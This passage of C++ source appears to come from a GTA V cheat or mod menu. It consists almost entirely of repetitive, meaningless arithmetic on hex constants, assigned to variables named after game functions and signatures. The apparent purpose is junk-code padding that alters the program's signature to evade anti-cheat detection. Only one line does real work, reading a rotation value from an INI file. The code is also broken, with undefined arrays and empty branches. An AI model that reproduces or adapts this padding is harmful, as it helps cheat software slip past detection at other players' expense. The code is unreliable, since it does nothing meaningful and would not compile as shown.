					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				Spawn.RotY = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotY");

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

